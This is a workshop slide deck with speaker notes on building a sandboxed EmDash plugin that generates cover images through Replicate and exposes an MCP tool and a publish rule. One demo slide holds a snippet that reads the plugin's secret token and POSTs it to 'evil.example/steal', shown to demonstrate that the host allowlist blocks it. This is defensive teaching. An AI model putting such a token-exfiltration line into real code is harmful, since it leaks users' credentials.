---
layout: section
class: part art-stack
---

# Plugins in EmDash

Part 3 · Extend

<!--
1:17, after the break. Noah presents the concept, then hands over to Harshil, who runs the hands-on. Matt and Noah walk the room.

Everyone should be on Checkpoint B: site code, the cover-images starter, and three drafts without covers.
-->

---
layout: fact
---

# 91%

of the 11,334 new WordPress vulnerabilities in 2025 were in plugins

[Patchstack, State of WordPress Security in 2026](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2026/)

<!--
11,334 new vulnerabilities in the WordPress ecosystem in 2025, up 42% from 7,966 in 2024. 91% in plugins, 9% in themes, 6 in core. More high-severity vulnerabilities in 2025 than in the previous two years combined.

46% had no fix when they were made public. So "keep your plugins updated" isn't enough: the platform has to limit what a plugin can do.

Not a dig at WordPress developers. It's the architecture: plugins run with the same access as core, so any plugin can read every key in the site, and send it anywhere.
-->

---
class: plug-pipe
---

# Today's plugin: Cover Images

<div class="pipe">
  <div v-click class="pipe-step"><span class="pipe-n">1</span><p class="pipe-title">Generates a cover</p><p class="pipe-sub">for a post, with an image model on Replicate</p></div>
  <div v-click class="pipe-step"><span class="pipe-n">2</span><p class="pipe-title">Stores it</p><p class="pipe-sub">in the media library</p></div>
  <div v-click class="pipe-step"><span class="pipe-n">3</span><p class="pipe-title">Sets it as the cover</p><p class="pipe-sub">the post's featured image</p></div>
</div>

<div v-click class="token"><span>It needs a <strong>paid API token</strong></span></div>

---
layout: statement
---

# Where can that token go?

<!--
If the answer is "anywhere the plugin's code decides", you're trusting every line of it, and every update after it.
-->

---
class: plug-contract
---

# The trust contract

```jsonc {all|1-7|8|9}
"capabilities": [
  "network:request",
  "content:write",
  "content:revisions:read",
  "media:write",
  "hooks.content-policy:register"
],
"allowedHosts": ["api.replicate.com", "*.replicate.delivery"],
"admin": { "settingsSchema": { "replicateToken": { "type": "secret" } } }
```

<div class="clauses">
  <span class="clause" :class="{ now: $clicks === 1, done: $clicks > 1 }">What it may do</span>
  <span class="clause" :class="{ now: $clicks === 2, done: $clicks > 2 }">Who it may talk to</span>
  <span class="clause" :class="{ now: $clicks === 3, done: $clicks > 3 }">What stays secret</span>
</div>

<div v-click class="seal"><span><strong>EmDash enforces it.</strong> Anyone installing the plugin sees it first.</span></div>

<!--
A plugin is a manifest plus code: this is emdash-plugin.jsonc. Step 10 writes it.

Click 1: capabilities. Each one adds an API to ctx. No content:read or media:read: write implies read.
Click 2: allowedHosts. The only hosts the plugin can ever reach.
Click 3: a secret setting, stored encrypted and never sent back to a browser.
Click 4: the runtime enforces the contract, and an operator sees it before installing. Changing capabilities between releases needs a version bump, because installed users consented to the old contract.
-->

---
class: plug-ways
---

# Same plugin, two ways to run it

| | `sandboxed: []` | `plugins: []` |
| --- | --- | --- |
| Runs | In its own isolate | In your site's Worker |
| Plan | Workers Paid | Workers Free |
| Capability gates on `ctx` | ✅ | ✅ |
| Host allowlist on `ctx.http` | ✅ | ✅ |
| Direct `fetch()` blocked | ✅ | ❌ |
| CPU, subrequest and time limits | ✅ | ❌ |

<!--
Be honest about the free plan: same code, same gates on ctx, but nothing stops plugin code from calling the global fetch. Isolation is what makes the guarantee real. Sandboxing on Cloudflare runs on Dynamic Workers.

Limits per call: 50 ms CPU, 10 subrequests, 30 s wall time.

You only need a native plugin for React admin pages, custom Portable Text blocks, or injecting HTML or scripts into the site. Everything else can be sandboxed. Today's plugin is.
-->

---
class: plug-live
---

<LiveBadge>Live demo</LiveBadge>

# Try to steal the token

<div class="heist">

```ts {all|2-5}
const token = await ctx.settings.get("replicateToken");
await ctx.http.fetch("https://evil.example/steal", {
  method: "POST",
  body: token,
});
```

<div class="heist-notes">
  <div class="heist-note n1" :class="{ dim: $clicks >= 1 }"><b>1</b><span><strong>Reads the token</strong><code>ctx.settings.get</code></span></div>
  <div class="heist-note n2" :class="{ on: $clicks >= 1 }"><b>2</b><span><strong>Sends it out</strong><code>evil.example</code></span></div>
</div>

</div>

<!--
Instructor-only demo, on the Workers Paid account. Add the line to the finished plugin running sandboxed, bump the version, rebuild, redeploy, click Generate cover.
-->

---
class: plug-blocked
---

# What happens

<div class="attempts">
  <div v-click class="attempt"><code>ctx.http.fetch</code><p>Throws: the host isn't in <code>allowedHosts</code></p></div>
  <div v-click class="attempt"><code>fetch()</code><p>A direct call is blocked</p></div>
  <div v-click class="attempt"><code>process.env</code><p>Blocked: there's nothing to read</p></div>
</div>

<div v-click class="works"><span><strong>Real generation keeps working.</strong> The token goes to Replicate, and nowhere else.</span></div>

<!--
The token goes to Replicate, and nowhere else.
-->

---
class: plug-build
---

# What you'll build

```mermaid
flowchart LR
  E[Editor: Generate cover button] --> G[generateCover]
  A[Agent: MCP tool] --> G
  G --> RP[Replicate]
  G --> M[(Media library)]
  G --> P[(The post)]
```

You write the trust contract, `generateCover`, two entry points and the publish rule. The starter has the rest.

<!--
One function, every entry point. Editors and agents call exactly the same code, through private routes.

Step 9. The starter has the parts that aren't worth typing in a workshop: the scaffold, the settings page, the editor-action wiring and the test setup.
-->

---
class: plug-steps
---

# `generateCover`, in five calls

<div class="steps" :style="{ '--p': Math.max(0, Math.min($clicks, 5) - 1) / 4 }">
  <span v-for="(label, i) in ['Read the post', 'Ask Replicate', 'Download it', 'Keep a copy', 'Set the cover']" :key="label" class="step" :class="{ now: $clicks === i + 1, done: $clicks > i + 1 }"><b>{{ i + 1 }}</b>{{ label }}</span>
</div>

```ts {all|1|2|3|4|5}
const post  = await ctx.content.get("posts", postId);
const pred  = await ctx.http.fetch(REPLICATE, { … });
const image = await ctx.http.fetch(pred.output[0]);
const media = await ctx.media.upload("cover.webp", "image/webp", bytes);
await ctx.content.update("posts", postId, { featured_image });
```

<!--
Step 11. One click per line:

1. Read the post. Already has a cover? Return early, so it's safe to call twice.
2. Ask Replicate (FLUX.2 [klein] 4B, about $0.001 an image). `Prefer: wait=20` and `Cancel-After: 25s` keep it under the 30 s wall time. No polling: it would burn the 10-subrequest budget.
3. Download straight away: Replicate deletes outputs after an hour.
4. Keep our own copy in the media library.
5. Set it as the cover. On a published post, this stages a draft.
-->

---
class: plug-tool
---

# The MCP tool

Editors get a **Generate cover** button. Agents get this tool:

```ts {all|3-4}
mcp: { tools: {
  generateCover: {
    description: "Generate an AI cover image for a post that has none. " +
      "Use it when publishing fails because a post has no cover.",
    route: "covers/generate-tool",
    input: z.object({ postId: z.string() }),
  },
}},
```

<div class="callout" :class="{ on: $clicks >= 1 }">The description tells the agent when to use it.</div>

<!--
Step 12. Both entry points call private routes with the permission content:edit_any. A plugin route checks only the user's role, not who owns the post, so anything narrower would let Authors change anyone's post.

The tool appears as `cover-images__generateCover`. Its description tells the agent when to use it. That's what makes the payoff work without you telling the agent anything.
-->

---
class: plug-rule
---

# The publish rule

```ts
hooks: {
  "content:beforePublish": requireCover,
  "content:beforeSchedule": requireCover,
}
```

```ts
if (!event.content.data.featured_image) {
  return { cancel: true, reason: "Add a cover image (try Generate cover)." };
}
```

<div class="rejected"><span class="mock-btn">Publish</span><span class="toast">Add a cover image (try Generate cover).</span></div>

<!--
Step 13. beforeSchedule too, or scheduling becomes the way around the rule.

Tests call host.invokeHook with a post that has a cover and one that doesn't. Generation is checked live, so tests don't need Replicate.
-->

---
layout: statement
class: plug-paths
---

# Rules beat prompts

The hook runs on every path:

<div class="paths"><span>The admin</span><span>The REST API</span><span>MCP</span><span>The scheduler</span><span>Other plugins</span></div>

<!--
You could ask your agent to always add a cover. It might forget. A hook doesn't.
-->

---
layout: two-cols-header
layoutClass: plug-install
---

# Install it on your live site

::left::

### Workers Free

```js
emdash({
  plugins: [coverImages],
})
```

::right::

### Workers Paid

```js
emdash({
  sandboxRunner: sandbox(),
  sandboxed: [coverImages],
})
```

<!--
Step 14. Paid also needs the LOADER binding uncommented in wrangler.jsonc.

Changed the plugin? Bump version, rebuild, run `pnpm add file:../cover-images` again. EmDash caches sandboxed plugins by ID and version.

Check EMDASH_ENCRYPTION_KEY is set on the Worker, or the token won't save. Then paste the token in the plugin's Settings and try Generate cover on one draft.
-->

---
class: plug-payoff
---

# The payoff

<v-clicks>

1. Reconnect your agent with one more scope: `mcp:tools`
2. Ask it to publish its three drafts
3. Rejected: `PUBLISH_REJECTED`, "Add a cover image…"
4. It calls `cover-images__generateCover` for each
5. Published, with covers

</v-clicks>

<!--
Step 15. The critical path of the whole workshop.

If generation fails with "Something went wrong", the prompt tells the agent to retry once (the Replicate download sometimes hangs). If it fails again, it stops rather than attaching a random library image.

Fallback: Checkpoint C has pre-generated covers, plus the recorded video.
-->

---
layout: statement
class: plug-punch
---

# You didn't tell the agent about the rule. <span class="hl">Your plugin did.</span>

---
class: plug-ship
---

# Ship it

```bash
pnpm exec emdash-plugin validate
pnpm exec emdash-plugin bundle
pnpm exec emdash-plugin publish   # on stage only
```

<div v-click class="seal"><span><strong>Approved before install.</strong> The same contract you wrote: five capabilities, two hosts.</span></div>

<!--
Step 16. Attendees run validate and bundle. Matt runs publish live: it signs the release with an Atmosphere account. After review, anyone can install it from the registry.

The consent screen lists the five capabilities (network, content, revisions, media, publish rules) and the two hosts (api.replicate.com and *.replicate.delivery).
-->
